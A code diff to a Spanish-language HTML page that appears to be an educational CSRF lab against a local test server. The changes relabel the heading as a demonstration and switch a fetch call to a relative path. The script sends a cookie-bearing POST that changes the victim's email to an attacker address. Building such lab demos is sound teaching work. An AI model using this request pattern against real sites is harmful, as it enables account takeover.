@@ -207,7 +207,7 @@
         
         <!-- Attack Information -->
         <div class="attack-info">
-            <h3>🔴 ESTO ES UN ATAQUE CSRF </h3>
+            <h3>🔴 ESTO ES UN ATAQUE CSRF - DEMOSTRACIÓN EDUCATIVA</h3>
             <p><strong>¿Qué está pasando?</strong></p>
             <p>Al hacer clic en el botón, se ejecuta automáticamente un formulario oculto que envía una petición POST al servidor vulnerable:</p>
             <code>&lt;form method="POST" action="http://localhost:5000/api/profile/email"&gt;
@@ -252,13 +252,13 @@
             statusDiv.textContent = '⏳ Ejecutando ataque CSRF...';
             
             try {
-                // Intentar CSRF attack usando fetch (JSON)
-                const response = await fetch('http://localhost:5000/api/profile/email', {
+                // ✅ Usar ruta RELATIVA (sin http://localhost:5000)
+                const response = await fetch('/api/profile/email', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    credentials: 'include', // Incluir cookies de sesión
+                    credentials: 'include', // Incluir cookies
                     body: JSON.stringify({
                         email: 'atacante@malicious.com'
                     })
